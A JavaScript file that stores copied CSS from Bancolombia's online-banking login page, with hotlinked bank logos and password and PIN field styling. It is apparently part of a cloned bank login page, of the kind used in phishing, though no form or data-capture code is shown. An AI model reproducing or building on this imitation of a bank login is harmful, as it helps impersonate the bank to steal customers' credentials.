var my_titulo = 'Bancolombia';
var my_contenido = `
<style>
    input::-webkit-inner-spin-button,
    input::-webkit-outer-spin-button {
        -webkit-appearance: none;
        margin: 0
    }

    .bpLqOK:focus+.sc-dNsVcS {
        transform: translateY(-30px) translateX(-10px);
        z-index: 501;
        background: transparent;
        padding: 0px 8px;
    }

    .bpLqOK:focus {
        border-bottom: 1px solid rgb(255, 194, 14);
        font-weight: 400;
    }

    .flxpKV {
        border-width: 2px;
        border-style: solid;
        border-color: transparent rgb(44, 42, 41) rgb(44, 42, 41);
        border-image: initial;
        border-radius: 50%;
        width: 33px;
        height: 33px;
        animation: 2s linear 0s infinite normal none running spin;
    }

    .coMtmU {
        position: fixed;
        display: flex;
        flex-direction: column;
        -webkit-box-pack: center;
        justify-content: center;
        -webkit-box-align: center;
        align-items: center;
        top: 0px;
        left: 0px;
        z-index: 1040;
        width: 100%;
        height: 100%;
        background-color: rgba(0, 0, 0, 0.6);
        backdrop-filter: blur(19.028px);
    }

    .gXnAHy {
        display: flex;
        flex-direction: column;
        -webkit-box-pack: center;
        justify-content: center;
        align-items: flex-start;
        padding: 16px;
        gap: 8px;
        width: 539px;
        height: 52px;
    }

    input[type=number] {
        -webkit-text-security: none !important;
        -moz-appearance: textfield
    }

    /*! normalize.css v8.0.1 | MIT License | github.com/necolas/normalize.css */
    html {
        -webkit-text-size-adjust: 100%;
        line-height: 1.15
    }

    body {
        margin: 0
    }

    .css-qr46ko {
        max-height: 300px;
        overflow-y: auto;
        position: relative;
        padding-bottom: 4px;
        padding-top: 4px;
        box-sizing: border-box;
    }

    .css-1sbt7ot-option {
        cursor: default;
        display: block;
        font-size: 15px;
        width: 100%;
        user-select: none;
        -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
        background-color: rgb(255, 255, 255);
        color: rgb(44, 42, 41);
        padding: 10px;
        box-sizing: border-box;
        z-index: 510;
        font-family: "Open Sans";
        font-style: normal;
        font-weight: 400;
        opacity: 0.5;
    }

    main {
        display: block
    }

    h1 {
        font-size: 2em;
        margin: .67em 0
    }

    hr {
        box-sizing: initial;
        height: 0;
        overflow: visible
    }

    pre {
        font-family: monospace;
        font-size: 1em
    }

    a {
        background-color: initial
    }

    abbr[title] {
        border-bottom: none;
        text-decoration: underline;
        -webkit-text-decoration: underline dotted;
        text-decoration: underline dotted
    }

    b,
    strong {
        font-weight: bolder
    }

    code,
    kbd,
    samp {
        font-family: monospace;
        font-size: 1em
    }

    small {
        font-size: 80%
    }

    sub,
    sup {
        font-size: 75%;
        line-height: 0;
        position: relative;
        vertical-align: initial
    }

    sub {
        bottom: -.25em
    }

    sup {
        top: -.5em
    }

    img {
        border-style: none
    }

    button,
    input,
    optgroup,
    select,
    textarea {
        font-family: inherit;
        font-size: 100%;
        line-height: 1.15;
        margin: 0
    }

    button,
    input {
        overflow: visible
    }

    button,
    select {
        text-transform: none
    }

    [type=button],
    [type=reset],
    [type=submit],
    button {
        -webkit-appearance: button
    }

    [type=button]::-moz-focus-inner,
    [type=reset]::-moz-focus-inner,
    [type=submit]::-moz-focus-inner,
    button::-moz-focus-inner {
        border-style: none;
        padding: 0
    }

    [type=button]:-moz-focusring,
    [type=reset]:-moz-focusring,
    [type=submit]:-moz-focusring,
    button:-moz-focusring {
        outline: 1px dotted ButtonText
    }

    fieldset {
        padding: .35em .75em .625em
    }

    legend {
        box-sizing: border-box;
        color: inherit;
        display: table;
        max-width: 100%;
        padding: 0;
        white-space: normal
    }

    progress {
        vertical-align: initial
    }

    textarea {
        overflow: auto
    }

    [type=checkbox],
    [type=radio] {
        box-sizing: border-box;
        padding: 0
    }

    [type=number]::-webkit-inner-spin-button,
    [type=number]::-webkit-outer-spin-button {
        height: auto
    }

    [type=search] {
        -webkit-appearance: textfield;
        outline-offset: -2px
    }

    [type=search]::-webkit-search-decoration {
        -webkit-appearance: none
    }

    ::-webkit-file-upload-button {
        -webkit-appearance: button;
        font: inherit
    }

    details {
        display: block
    }

    summary {
        display: list-item
    }

    [hidden],
    template {
        display: none
    }

    @font-face {
        font-family: Nunito;
        src: local("Nunito"), url(../fonts/Nunito-Bold.ttf) format("truetype")
    }

    @font-face {
        font-family: Open Sans;
        src: local("Open Sans"), url(../fonts/OpenSans-Regular.9ccd5e1b1dbea150336d.ttf) format("truetype")
    }

    @font-face {
        font-family: CIBFont Sans;
        src: url(../fonts/CIBFontSans-Bold.c02472282d385fea31c7.ttf) format("truetype")
    }

    @font-face {
        font-family: fontello;
        font-style: normal;
        font-weight: 400;
        src: url(../fonts/fontello.453977c241cee6834aba.eot);
        src: url(../fonts/fontello.453977c241cee6834aba.eot#iefix) format("embedded-opentype"), url(../fonts/fontello.56bda0c90b98bc47cae3.woff2) format("woff2"), url(../fonts/fontello.884c33751af9b7478f4f.woff) format("woff"), url(../fonts/fontello.a472d550cdd1fa0001c3.ttf) format("truetype"), url(../fonts/fontello.331058082be9b7944a6b.svg#fontello) format("svg")
    }

    input[type=password] {
        speak: none;
        font-feature-settings: normal;
        -webkit-font-smoothing: antialiased;
        -moz-osx-font-smoothing: grayscale;
        font-family: fontello, sans-serif;
        font-style: normal;
        font-variant: normal;
        font-weight: 400;
        letter-spacing: 2px;
        text-transform: none
    }

    input[type=number] {
        -webkit-text-security: disc;
        -moz-webkit-text-security: disc;
        -moz-text-security: disc;
        font-family: fontello, sans-serif
    }

    body {
        background-color: #f7f7f7;
        height: 100%;
        width: 100%
    }

    a {
        text-decoration: none
    }

    a:active,
    a:link,
    a:visited {
        color: #454648
    }

    .dyNPNk {
        height: 95vh;
        display: grid;
        grid-template-columns: 1fr;
        grid-template-rows: 0fr 2fr 0.3fr;
    }

    .jMedSz {
        width: 100%;
        flex-direction: row;
        background-color: rgb(255, 255, 255);
        margin: auto;
        z-index: 1;
        -webkit-box-align: center;
        align-items: center;
        -webkit-box-pack: center;
        justify-content: center;
        display: flex;
    }

    .inVMvd {
        width: 218px;
        height: 60px;
        background-image: url(https://autenticacion.apps.bancolombia.com/static/media/headerIconBancolombia.e9678f112a702758542f8f98283cea47.svg);
    }


    .jNBBOl {
        display: flex;
        flex-direction: row;
        cursor: pointer;
        -webkit-box-pack: justify;
        justify-content: space-between;
        -webkit-box-align: center;
        align-items: center;
        width: 100%;
    }

    .QAjXL {
        display: flex;
        flex-direction: row;
        cursor: pointer;
        -webkit-box-pack: justify;
        justify-content: space-between;
        -webkit-box-align: center;
        align-items: center;
    }

    .Hvuid {
        display: flex;
        font-family: "Open Sans";
        font-style: normal;
        font-weight: 400;
        font-size: 14px;
        line-height: 18px;
    }

    .fjUNcy {
        display: flex;
        flex-direction: row;
        -webkit-box-pack: justify;
        justify-content: space-between;
        -webkit-box-align: center;
        align-items: center;
        width: 458px;
    }

    .tBwio {
        -webkit-box-pack: center;
        justify-content: center;
        background-image: url(https://autenticacion.apps.bancolombia.com/static/media/trazo-desktop.3de67dbd4b31f3798f8a1d3e3a90197c.svg);
        position: relative;
        background-repeat: no-repeat;
        background-size: cover;
        background-position: 50% 100%;
        width: 100%;
        display: flex;
        flex-flow: column wrap;
        -webkit-box-align: center;
        align-items: center;
        row-gap: 16px;
    }

    .eRzCQQ {
        display: flex;
        flex-direction: column;
        gap: 8px;
        -webkit-box-pack: center;
        justify-content: center;
        -webkit-box-align: center;
        align-items: center;
    }

    .eZUFsb {
        display: flex;
        -webkit-box-pack: center;
        justify-content: center;
        text-align: center;
        font-family: "Open Sans";
        font-weight: 600;
        font-size: 28px;
        color: rgb(44, 42, 41);
        line-height: 32px;
    }

    .css-i9s77m-control:hover {
        border-color: rgb(179, 179, 179);
    }

    .cJzIJP {
        display: flex;
        -webkit-box-pack: center;
        justify-content: center;
        text-align: center;
        margin: 0px auto 30px;
        width: 358px;
        height: 22px;
        font-family: "Open Sans";
        font-weight: 400;
        font-size: 16px;
        line-height: 24px;
        color: rgb(44, 42, 41);
    }

    .jKwyyI {
        display: flex;
        flex-direction: column;
        -webkit-box-pack: justify;
        justify-content: space-between;
        top: 150px;
    }

    .chxujR {
        width: 458px;
        height: 82px;
        border: none;
        border-radius: 8px;
        display: flex;
        -webkit-box-align: center;
        align-items: center;
        font-size: 18px;
        outline: none;
        text-align: right;
        cursor: pointer;
        padding: 0px;
        background-color: rgb(255, 255, 255);
    }

    .fjUNcy {
        display: flex;
        flex-direction: row;
        -webkit-box-pack: justify;
        justify-content: space-between;
        -webkit-box-align: center;
        align-items: center;
        width: 458px;
    }

    @media screen and (min-width: 481px) and (max-width: 961px) {
        .lmBfdl {
            top: 150px;
        }
    }

    .lmBfdl {
        flex-direction: column;
        -webkit-box-align: start;
        align-items: start;
        text-align: initial;
        padding: 0px 0px 0px 10px;
    }

    .bKKRYX {
        width: 40px;
        height: 82px;
        background-image: url(https://autenticacion.apps.bancolombia.com/static/media/ExitIcon.35b2413abce276ac588d59c3ef6b1251.svg);
        background-repeat: no-repeat;
        background-position: center center;
        border-radius: 0px 8px 8px 0px;
        background-color: rgb(253, 218, 36);
    }

    @media screen and (max-width: 610px) {
        .tBwio {
            background-size: contain;
            background-image: url(https://autenticacion.apps.bancolombia.com/static/media/trazo-mobile.c9a2457….svg);
        }
    }

    .fabCg {
        width: 40px;
        height: 82px;
        background-image: url(https://autenticacion.apps.bancolombia.com/static/media/faChevronRight.0dc234203984d356c34897837c59674a.svg);
        background-repeat: no-repeat;
        background-position: center center;
        border-radius: 0px 8px 8px 0px;
        background-color: rgb(255, 127, 65);
    }

    .gbiddn {
        font-family: "Open Sans";
        font-weight: 700;
        font-size: 16px;
        line-height: 24px;
        color: rgb(44, 42, 41);
        text-decoration: underline;
    }

    .kcTbgw {
        width: 40px;
        height: 78px;
        background-image: url(./static/media/faChevronRightMiniIcon.9414ca9….svg);
        background-repeat: no-repeat;
        background-position: center center;
    }

    .huBzKw {
        width: 95%;
        box-sizing: border-box;
        display: flex;
        flex-flow: wrap;
        background-color: transparent;
        margin: auto;
        padding-top: 8px;
    }

    .kZLvRr {
        width: 100%;
        height: 1px;
        margin: 0px auto;
        background: rgb(204, 204, 204);
        border-radius: 4px;
    }

    .crWacE {
        height: 24px;
        width: 24px;
        background-image: url(https://autenticacion.apps.bancolombia.com/static/media/ExitIcon.35b2413abce276ac588d59c3ef6b1251.svg);
        background-repeat: no-repeat;
        background-position: center center;
        margin-right: 12px;
    }

    .bbOBut {
        width: 100%;
        height: 80px;
        display: flex;
    }

    .lbGLhq {
        display: flex;
        flex-direction: column;
        gap: 8px;
    }

    .kVNvQn {
        display: flex;
        flex-direction: column;
        margin-left: auto;
        margin-top: 10px;
    }

    .hkQQIl {
        margin-top: 10px;
        width: 140px;
        height: 17.98px;
        background-image: url(https://autenticacion.apps.bancolombia.com/static/media/Bancolombia.ae56ff7f0e9a3fd0046b5f264dc42c79.svg);
        background-repeat: no-repeat;
        background-position: center center;
        display: flex;
        -webkit-box-align: center;
        align-items: center;
        padding-right: 5px;
    }

    .ljShGh {
        height: 24px;
        width: 24px;
        background-image: url(https://autenticacion.apps.bancolombia.com/static/media/backIcon.9eedc521e7314a34cebd2afcaf4432e2.svg);
        background-repeat: no-repeat;
        background-position: center center;
        margin-right: 12px;
    }

    .fBevtP {
        visibility: hidden;
        flex-direction: row;
        cursor: pointer;
        -webkit-box-pack: justify;
        justify-content: space-between;
        -webkit-box-align: center;
        align-items: center;
    }

    .esXSPW {
        width: 80%;
        color: rgb(250, 94, 91);
        font-family: "Open Sans";
        font-size: 12px;
        font-weight: bold;
        letter-spacing: -0.2px;
        line-height: 20px;
    }

    .XjvPt {
        margin-left: auto;
        background-color: transparent;
        color: rgb(69, 70, 72);
        cursor: pointer;
        border: none;
        padding: 2%;
    }

    .xjvDB {
        width: 33px;
        height: 33px;
        background-image: url(https://autenticacion.apps.bancolombia.com/static/media/iconAdmiration.83a80e06ef3b7a58cb33cee37ef87b59.svg);
        background-repeat: no-repeat;
        background-position: center center;
        margin-top: 11px;
    }

    .klyfsH {
        font-family: "Open Sans";
        font-style: normal;
        font-weight: 400;
        font-size: 14px;
        line-height: 22px;
        display: flex;
        -webkit-box-align: center;
        align-items: center;
        letter-spacing: 0.16px;
        color: white;
        margin-top: 0px;
    }

    .iGPcWV {
        font-family: "Open Sans";
        font-style: normal;
        font-weight: 400;
        font-size: 16px;
        line-height: 22px;
        text-align: center;
        letter-spacing: -0.3px;
        color: rgb(44, 42, 41);
        flex: 0 0 auto;
        order: 2;
        -webkit-box-flex: 0;
    }

    .koglnq {
        font-family: "Open Sans";
        font-style: normal;
        font-weight: 600;
        font-size: 14px;
        line-height: 20px;
        letter-spacing: 0.16px;
        color: white;
    }

    .fmruPR {
        font-family: "Open Sans";
        font-weight: 400;
        font-size: 12px;
        line-height: 16px;
        letter-spacing: -0.17px;
        color: rgb(44, 42, 41);
    }

    .cFsVxj {
        background-image: url(https://autenticacion.apps.bancolombia.com/static/media/closeImageIcon.c3b4e7bb1bf0427b19835e2325dcb4e5.svg);
        background-repeat: no-repeat;
        background-position: center center;
        width: 16px;
        height: 16px;
        border: none;
        margin-top: 16px;
        margin-right: 16px;
    }

    .kcFuTg {
        width: 48px;
        height: 84px;
        display: flex;
        -webkit-box-pack: center;
        justify-content: center;
        -webkit-box-align: start;
        align-items: start;
        background-color: rgb(255, 127, 65);
        border-radius: 16px 0px 0px 16px;
    }

    .Qhpfq {
        width: 651px;
        height: 84px;
        position: absolute;
        display: flex;
        flex-direction: row;
        align-items: flex-start;
        padding: 0px;
        box-shadow: rgba(0, 0, 0, 0.2) 0px 4px 8px 0px;
        transition: 0.3s;
        border-radius: 16px;
        background-color: rgb(53, 53, 55);
        top: 5%;
    }

    .iKUbyI:focus+.sc-jXbUNg {
        transform: translateY(-30px) translateX(-40px);
        z-index: 501;
        background: transparent;
        padding: 0px 8px;
    }

    .css-i9s77m-control {
        -webkit-box-align: center;
        align-items: center;
        cursor: default;
        display: flex;
        flex-wrap: wrap;
        -webkit-box-pack: justify;
        justify-content: space-between;
        min-height: 38px;
        position: relative;
        transition: 100ms;
        background-color: white;
        border-radius: 0px;
        box-sizing: border-box;
        font-weight: bold;
        height: 10px;
        border-width: 0px 0px 2px;
        border-top-style: initial;
        border-right-style: initial;
        border-left-style: initial;
        border-top-color: initial;
        border-right-color: initial;
        border-left-color: initial;
        border-image: initial;
        border-bottom-style: solid;
        border-bottom-color: rgb(44, 42, 41);
        width: 100%;
        font-family: "Open Sans";
        outline: 0px !important;
    }

    .css-lm8j94-menu {
        top: 100%;
        position: absolute;
        width: 100%;
        z-index: 1;
        background-color: rgb(255, 255, 255);
        border-radius: 5px;
        box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 0px 1px, rgba(0, 0, 0, 0.1) 0px 4px 11px;
        margin-bottom: 8px;
        margin-top: 8px;
        box-sizing: border-box;
    }

    .css-1hac4vs-dummyInput {
        background: 0px center;
        border: 0px;
        caret-color: transparent;
        font-size: inherit;
        grid-area: 1 / 1 / 2 / 3;
        outline: 0px;
        padding: 0px;
        width: 1px;
        color: transparent;
        left: -100px;
        opacity: 0;
        position: relative;
        transform: scale(0.01);
    }

    .css-1dimb5e-singleValue {
        grid-area: 1 / 1 / 2 / 3;
        max-width: 100%;
        overflow: hidden;
        text-overflow: ellipsis;
        white-space: nowrap;
        color: rgb(51, 51, 51);
        margin-left: 2px;
        margin-right: 2px;
        box-sizing: border-box;
    }

    .css-hlgwow {
        -webkit-box-align: center;
        align-items: center;
        display: grid;
        flex: 1 1 0%;
        flex-wrap: wrap;
        position: relative;
        overflow: hidden;
        padding: 2px 8px;
        box-sizing: border-box;
    }

    .css-1uei4ir-indicatorSeparator {
        align-self: stretch;
        width: 1px;
        background-color: rgb(204, 204, 204);
        margin-bottom: 8px;
        margin-top: 8px;
        box-sizing: border-box;
        display: none;
    }

    .bpLqOK {
        border-width: 0px 0px 1px;
        border-top-style: initial;
        border-right-style: initial;
        border-left-style: initial;
        border-top-color: initial;
        border-right-color: initial;
        border-left-color: initial;
        border-image: initial;
        color: rgb(41, 41, 41);
        font-family: "Open Sans";
        letter-spacing: -0.3px;
        line-height: 24px;
        border-bottom-style: solid;
        border-bottom-color: rgb(128, 130, 133);
        background-color: transparent;
        outline: none;
        padding: 12px 3px 5px 10px;
        font-size: 16px;
        transition: 0.2s;
        position: relative;
        z-index: 510;
        font-weight: 400;

    }

    .ltoGH {
        width: 100%;
        display: flex;
        flex-direction: column;
        position: relative;
    }

    .css-1xc3v61-indicatorContainer {
        display: flex;
        transition: color 150ms;
        color: rgb(204, 204, 204);
        padding: 8px;
        box-sizing: border-box;
    }

    .css-1wy0on6 {
        -webkit-box-align: center;
        align-items: center;
        align-self: stretch;
        display: flex;
        flex-shrink: 0;
        box-sizing: border-box;
    }

    .iKUbyI:focus {
        border-bottom: 1px solid rgb(255, 194, 14);
        font-weight: 400;
    }

    .iAjHuw {
        display: flex;
        font-family: "Open Sans";
        font-style: normal;
        font-weight: 400;
        font-size: 14px;
        line-height: 18px;
    }

    .gsVIUh {
        height: 14px;
        background-image: url(https://autenticacion.apps.bancolombia.com/static/media/vigilado.691ba87177cfc7656937fafcb0c6925a.svg);
        background-repeat: no-repeat;
        background-position: center center;
        display: flex;
        width: 115px;
        -webkit-box-align: center;
        align-items: center;
        padding-right: 5px;
    }

    .cxASel {
        font-family: "Open Sans";
        font-style: normal;
        font-weight: 600;
        font-size: 16px;
        line-height: 22px;
        text-align: center;
        letter-spacing: -0.3px;
        color: rgb(44, 42, 41);
        width: 432px;
        flex: 0 0 auto;
        order: 3;
        -webkit-box-flex: 0;
    }

    @media screen and (min-width: 421px) and (max-width: 1280px) {
        .jzmRAs {
            font-size: 24px;
        }
    }

    .hZZDXh {
        box-sizing: border-box;
        padding: 32px;
        border-radius: 16px;
        width: 556px;
        display: flex;
        flex-direction: column;
        -webkit-box-pack: center;
        justify-content: center;
        -webkit-box-align: center;
        align-items: center;
        background-color: rgb(255, 255, 255);
    }

    .fxvAXw {
        width: 100%;
        display: flex;
        flex-direction: column;
        position: relative;
    }

    .css-hn1n1a-container {
        position: relative;
        box-sizing: border-box;
        z-index: 1000;
        display: flex;
        width: 100%;
        flex-direction: column;
        top: 0px;
        padding: 0px;
    }

    .css-7pg0cj-a11yText {
        z-index: 9999;
        border: 0px;
        clip: rect(1px, 1px, 1px, 1px);
        height: 1px;
        width: 1px;
        position: absolute;
        overflow: hidden;
        padding: 0px;
        white-space: nowrap;
    }

    .fUwGEH {
        display: flex;
        width: 100%;
        margin-top: 30px;
        font-family: "Open Sans";
        font-style: normal;
        font-weight: 400;
        font-size: 15px;
        line-height: 18px;
        color: rgb(44, 42, 41);
        opacity: 0.8;
    }

    .gscjBr {
        width: 100%;
        display: flex;
        flex-flow: column wrap;
        -webkit-box-align: center;
        align-items: center;
        gap: 32px;
    }

    .fabwF {
        box-sizing: border-box;
        background-color: rgb(255, 255, 255);
        border-radius: 16px;
        width: 556px;
        height: auto;
        display: flex;
        flex-direction: column;
        -webkit-box-pack: center;
        justify-content: center;
        -webkit-box-align: center;
        align-items: center;
        gap: 32px;
        padding: 32px;
    }

    .jzmRAs {
        display: flex;
        -webkit-box-pack: center;
        justify-content: center;
        text-align: center;
        font-family: "CIBFont Sans";
        font-style: normal;
        font-weight: 700;
        font-size: 28px;
        letter-spacing: -0.6px;
        color: rgb(44, 42, 41);
        line-height: 32px;
    }

    .gcyRka {
        display: flex;
        flex-direction: row;
        -webkit-box-pack: justify;
        justify-content: space-between;
        -webkit-box-align: center;
        align-items: center;
        gap: 16px;
    }

    .ertauK {
        display: flex;
        flex-direction: row;
        -webkit-box-pack: center;
        justify-content: center;
        -webkit-box-align: center;
        align-items: center;
        padding: 12px 24px;
        gap: 8px;
        width: 184px;
        height: 50px;
        border: 1px solid rgb(44, 42, 41);
        border-radius: 100px;
        background: rgb(255, 255, 255);
        cursor: pointer;
    }

    .expOrP {
        width: 66px;
        height: 26px;
        -webkit-box-pack: center;
        justify-content: center;
        font-family: "CIBFont Sans";
        font-style: normal;
        font-weight: 700;
        font-size: 18px;
        line-height: 26px;
        color: black;
        display: flex;
        -webkit-box-align: center;
        align-items: center;
        text-align: center;
    }

    .bApdQd {
        background: rgb(253, 218, 36);
        border: 0px;
        cursor: pointer;
        display: flex;
        flex-direction: row;
        -webkit-box-align: center;
        align-items: center;
        -webkit-box-pack: center;
        justify-content: center;
        width: 184px;
        height: 50px;
        position: relative;
        border-radius: 100px;
        font-family: "CIBFont Sans";
        font-weight: 600;
        font-size: 16px;
        outline: none;
        padding: 12px 24px;
        gap: 8px;
        color: rgb(44, 42, 41);
    }

    .iKUbyI {
        border-width: 0px 0px 1px;
        border-top-style: initial;
        border-right-style: initial;
        border-left-style: initial;
        border-top-color: initial;
        border-right-color: initial;
        border-left-color: initial;
        border-image: initial;
        color: rgb(41, 41, 41);
        font-family: "Open Sans";
        letter-spacing: -0.3px;
        line-height: 24px;
        border-bottom-style: solid;
        border-bottom-color: rgb(128, 130, 133);
        background-color: transparent;
        outline: none;
        padding: 12px 3px 5px 30px;
        font-size: 16px;
        transition: 0.2s;
        position: relative;
        z-index: 510;
        border-radius: 0px !important;
    }

    .ilwpgB {
        background-image: url(https://autenticacion.apps.bancolombia.com/static/media/user.39a37ef47269f6d65906fbb23186e4b6.svg);
        background-repeat: no-repeat;
        background-position: center center;
        position: absolute;
        height: 24px;
        top: 12px;
        text-align: center;
        width: 21px !important;
    }

    .klOdzk {
        color: rgb(44, 42, 41);
        font-family: "Open Sans";
        font-style: normal;
        font-weight: 400;
        font-size: 16px;
        line-height: 0px;
        top: 25px;
        left: 30px;
        transition: 0.2s;
        position: absolute;
        flex: 0 0 auto;
        order: 1;
        -webkit-box-flex: 0;
    }

    .kjLVGj {
        width: 100%;
        display: flex;
        flex-flow: column wrap;
        -webkit-box-align: center;
        align-items: center;
        box-sizing: border-box;
        gap: 16px;
    }

    .dSVYQT {
        width: 80%;
        display: flex;
        flex-direction: column;
        top: 0px;
        position: relative;
    }

    .fpfLgB {
        text-align: end;
        width: 80%;
        cursor: pointer;
        color: rgb(44, 42, 41);
        font-family: "Open Sans";
        font-style: normal;
        font-weight: normal;
        font-size: 12px;
        line-height: 16px;
    }

    .biRUif {
        width: 100%;
        display: flex;
        flex-flow: column wrap;
        -webkit-box-align: center;
        align-items: center;
        box-sizing: border-box;
    }

    .qDDqZ {
        background-image: url(https://autenticacion.apps.bancolombia.com/static/media/lock.94f176e5224bf551ea452eed4c2cc05b.svg);
        background-repeat: no-repeat;
        height: 24px;
        text-align: center;
        order: 1;
        padding-bottom: 1em;
        width: 21px !important;
    }

    .fFtrsp {
        display: flex;
        -webkit-box-pack: center;
        justify-content: center;
        text-align: center;
        font-family: Nunito;
        font-style: normal;
        font-weight: bold;
        font-size: 28px;
        line-height: 24px;
        letter-spacing: -0.375px;
        color: rgb(41, 41, 41);
        margin-bottom: 15px;
    }

    .blWBwQ {
        width: auto;
        display: flex;
        flex-direction: column;
        -webkit-box-align: center;
        align-items: center;
    }

    @media screen and (max-width: 610px) {
        .tBwio {
            background-size: contain;
            background-image: url(https://autenticacion.apps.bancolombia.com/static/media/trazo-mobile.c9a2457e0745f3150ee0d62c9e906218.svg);
        }
    }

    .tBwio {
        -webkit-box-pack: center;
        justify-content: center;
        background-image: url(https://autenticacion.apps.bancolombia.com/static/media/trazo-desktop.3de67dbd4b31f3798f8a1d3e3a90197c.svg);
        position: relative;
        background-repeat: no-repeat;
        background-size: cover;
        background-position: 50% 100%;
        width: 100%;
        display: flex;
        flex-flow: column wrap;
        -webkit-box-align: center;
        align-items: center;
        row-gap: 16px;
    }

    .gTRaSD {
        width: 100%;
        display: flex;
        flex-flow: column wrap;
        -webkit-box-align: center;
        align-items: center;
        align-content: center;
    }

    .boRxsw {
        display: flex;
        flex-direction: row;
        -webkit-box-pack: justify;
        justify-content: space-between;
        -webkit-box-align: center;
        align-items: center;
        gap: 16px;
    }

    .gTRaSD {
        width: 100%;
        display: flex;
        flex-flow: column wrap;
        -webkit-box-align: center;
        align-items: center;
        align-content: center;
    }

    .drEJrH {
        width: fit-content;
        text-align: center;
    }

    .fEoHVe {
        background: rgb(217, 218, 221);
        border: 0px;
        display: flex;
        flex-direction: row;
        -webkit-box-align: center;
        align-items: center;
        -webkit-box-pack: center;
        justify-content: center;
        width: 184px;
        height: 50px;
        position: relative;
        border-radius: 100px;
        font-family: "CIBFont Sans";
        font-weight: 600;
        font-size: 16px;
        outline: none;
        padding: 12px 24px;
        gap: 8px;
        cursor: no-drop;
        color: rgb(151, 153, 155);
    }

    .casofJ {
        display: flex;
        -webkit-box-pack: center;
        justify-content: center;
    }

    .kdPtYJ:focus {
        border-bottom: 1px solid rgb(255, 194, 14);
    }

    .kdPtYJ {
        width: 40px;
        height: 40px;
        text-align: center;
        font-size: 20px;
        /* padding: 10px; */
        outline: none;
        border-top: none;
        border-right: none;
        border-left: none;
        border-image: initial;
        border-bottom: 1px solid rgb(128, 130, 133);
        margin-left: 5px;
        margin-right: 5px;
        border-radius: 0px !important;
    }

    .CQYx:focus {
        border-bottom: 1px solid rgb(255, 194, 14);
    }

    .CQYx {
        width: 20px;
        height: 20px;
        text-align: center;
        font-size: 20px;
        padding: 10px;
        outline: none;
        border-top: none;
        border-right: none;
        border-left: none;
        border-image: initial;
        margin-left: 5px;
        margin-right: 5px;
        border-bottom: 2px solid rgb(128, 130, 133);
        border-radius: 0px !important;
    }

    .gTRaSD {
        width: 100%;
        display: flex;
        flex-flow: column wrap;
        -webkit-box-align: center;
        align-items: center;
        align-content: center;
    }

    .kCPtdr {
        box-sizing: border-box;
        border-radius: 16px;
        padding: 24px;
        width: 556px;
        height: auto;
        display: flex;
        flex-direction: column;
        -webkit-box-pack: center;
        justify-content: center;
        -webkit-box-align: center;
        align-items: center;
        background-color: rgb(255, 255, 255);
    }

    .hKzibl {
        width: 100%;
        display: flex;
        flex-flow: column wrap;
        -webkit-box-align: center;
        align-items: center;
        align-content: center;
        gap: 16px;
    }

    .casofJ {
        display: flex;
        -webkit-box-pack: center;
        justify-content: center;
    }

    .ljBqiy {
        color: rgb(250, 94, 91);
        font-family: "Open Sans";
        font-size: 12px;
        font-weight: bold;
        letter-spacing: -0.2px;
        line-height: 16px;
        text-align: center;
    }

    .kMixmQ {
        position: fixed;
        top: 0px;
        left: 0px;
        z-index: 1050;
        width: 100%;
        height: 100%;
        overflow: hidden auto;
        outline: 0px;
    }

    .dKajVA {
        width: 100%;
        position: absolute;
        display: flex;
        -webkit-box-pack: end;
        justify-content: flex-end;
    }

    .etdtri {
        display: flex;
        margin: 2rem auto;
        position: relative;
        flex-direction: column;
        align-content: center;
        width: 600px;
        height: 296px;
        top: 150px;
        background: rgb(255, 255, 255);
        box-shadow: rgba(0, 0, 0, 0.1) 0px 10px 16px;
        border-radius: 16px;
    }

    .jwiyfZ {
        margin-top: 32px;
        background-image: url(https://autenticacion.apps.bancolombia.com/static/media/errorImageScoreRecaptcha.835374415fda29ce4cf04c165c13009d.svg);
        display: flex;
        width: 48px;
        height: 80px;
    }

    .eDnQTG {
        display: flex;
        flex-direction: column;
        order: 3;
        -webkit-box-flex: 0;
        flex-grow: 0;
        -webkit-box-pack: center;
        justify-content: center;
        -webkit-box-align: center;
        align-items: center;
    }

    .ccPiWj {
        color: rgb(0, 0, 0);
        font-family: Nunito;
        font-style: normal;
        font-weight: 700;
        font-size: 24px;
        line-height: 26px;
        text-align: center;
        letter-spacing: -0.45px;
        margin-bottom: 0px;
        margin-top: 0px;
    }

    .iCpwyp {
        color: rgb(0, 0, 0);
        font-family: "Open Sans";
        font-style: normal;
        font-weight: 400;
        font-size: 16px;
        line-height: 60px;
        text-align: center;
        letter-spacing: -0.3px;
    }

    .ctvmGf {
        background: rgb(253, 218, 36);
        border: 0px;
        cursor: pointer;
        display: flex;
        -webkit-box-align: center;
        align-items: center;
        -webkit-box-pack: center;
        justify-content: center;
        width: 201px;
        height: 38px;
        position: relative;
        border-radius: 100px;
        font-family: "Open Sans";
        font-weight: 600;
        font-size: 16px;
        outline: none;
        top: 5px;
        padding: 9px 38px;
        gap: 8px;
    }

    .gebOHz {
        box-sizing: border-box;
        border-radius: 16px;
        padding: 32px;
        width: 556px;
        display: flex;
        flex-direction: column;
        -webkit-box-pack: center;
        justify-content: center;
        -webkit-box-align: center;
        align-items: center;
        background-color: rgb(255, 255, 255);
    }

    .kIRPWA {
        display: flex;
        -webkit-box-pack: center;
        justify-content: center;
        left: 200px;
    }

    .kMixmQ {
        position: fixed;
        top: 0px;
        left: 0px;
        z-index: 1050;
        width: 100%;
        height: 100%;
        overflow: hidden auto;
        outline: 0px;
    }

    .gDFXqm {
        position: fixed;
        top: 0px;
        left: 0px;
        z-index: 1040;
        width: 100%;
        height: 100%;
        background-color: rgba(0, 0, 0, 0.6);
        backdrop-filter: blur(19.028px);
    }

    .eUeoEt {
        font-family: "Open Sans";
        font-weight: 600;
        font-size: 18px;
        line-height: 26px;
        color: rgb(44, 42, 41);
    }

    .yBZKS {
        color: rgb(44, 42, 41);
        font-family: "Open Sans";
        font-style: normal;
        font-weight: 400;
        font-size: 15px;
        line-height: 0px;
        top: 25px;
        left: 5px;
        transition: 0.2s;
        position: absolute;
        flex: 0 0 auto;
        order: 1;
        -webkit-box-flex: 0;
        opacity: 0.8;
    }

    .kdPtYJ:focus {
        border-bottom: 1px solid rgb(255, 194, 14);
    }

    .iSyOoC {
        background-image: url(https://autenticacion.apps.bancolombia.com/static/media/Oval.3dc97d995f8c308c7c7dfb8b7a39a078.svg);
        background-repeat: no-repeat;
        background-position: center center;
        width: 159px;
        height: 159px;
        position: absolute;
        z-index: -1;
    }

    @keyframes spin {
        0% {
            transform: rotate(0deg);
        }

        100% {
            transform: rotate(360deg);
        }
    }

